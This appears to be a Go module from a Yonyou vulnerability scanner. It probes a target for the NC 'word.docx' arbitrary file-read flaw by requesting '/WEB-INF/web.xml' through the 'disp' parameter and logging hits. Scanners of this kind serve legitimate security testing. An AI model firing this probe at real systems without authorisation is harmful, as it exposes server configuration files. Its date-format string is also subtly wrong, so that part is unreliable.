package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func NcwordScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	NCword := "用友 NC-word.docx 文件读取漏洞"
	urls := address + "/portal/docctr/open/word.docx?disp=/WEB-INF/web.xml"

	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, NCword)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, NCword)
		}
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应失败: %v", Cyan, currentTime, Reset, Yellow, Reset, NCword, err)
		fmt.Println(output)
		return
	}

	if strings.Contains(string(body), "filter-name") {
		result := NCword + "：" + urls
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, NCword, urls)
		fmt.Println(output)

		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			log.Printf("保存结果到文件出错: %v", err)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, NCword, response.StatusCode)
		fmt.Println(output)
	}
}
